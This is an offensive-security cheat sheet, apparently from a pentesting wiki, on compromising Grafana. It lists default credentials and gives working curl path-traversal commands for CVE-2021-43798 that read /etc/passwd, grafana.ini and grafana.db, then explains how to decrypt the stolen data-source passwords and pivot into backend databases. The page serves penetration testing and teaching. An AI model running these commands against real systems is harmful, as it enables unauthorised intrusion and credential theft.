---
tags:
  - Web
---

# :material-chart-areaspline: Grafana

<span class="pill pill-medium">dashboards</span> <span class="pill pill-info">web</span>

Grafana dashboards sit in front of data sources (Prometheus, SQL, cloud) and hold
their credentials. Default creds and a well-known path-traversal make it a quick win.

!!! abstract "TL;DR"
    Try `admin:admin` → check version for **CVE-2021-43798** (unauth arbitrary file
    read) → dump data-source credentials → pivot into the backing databases.

## :material-magnify: Identify

```bash
curl -s http://$TARGET:3000/login | grep -i grafana
curl -s http://$TARGET:3000/api/health          # {"version":"8.x.x", ...}
```

## :material-file-eye: CVE-2021-43798 — unauth path traversal

Read any file (Grafana 8.0.0–8.3.0) via a plugin path:

```bash
curl --path-as-is "http://$TARGET:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
# The prize: Grafana's own config + its SQLite DB (contains data-source secrets)
curl --path-as-is "http://$TARGET:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"
curl --path-as-is "http://$TARGET:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db"
```

!!! loot "grafana.db holds data-source creds"
    The SQLite DB has the admin hash + AES-encrypted data-source passwords
    (decryptable with the `secret_key` from `grafana.ini`) → pivot into
    Prometheus/MySQL/cloud data sources.

## :material-fire: Authenticated

```text
# admin → data sources → SQL data source → run arbitrary queries on the backend DB
# admin → can add users, API keys; some versions allow SSRF via data-source proxy
```

## :material-shield-check: Remediation

- Change default creds; patch (43798 is trivial); rotate the `secret_key` and
  data-source passwords; don't expose Grafana to untrusted networks.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Data-source proxy → [SSRF](../web/ssrf.md); backing DBs → [MSSQL](../network/mssql.md).
- Reference: [HackTricks Grafana](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/grafana.html).
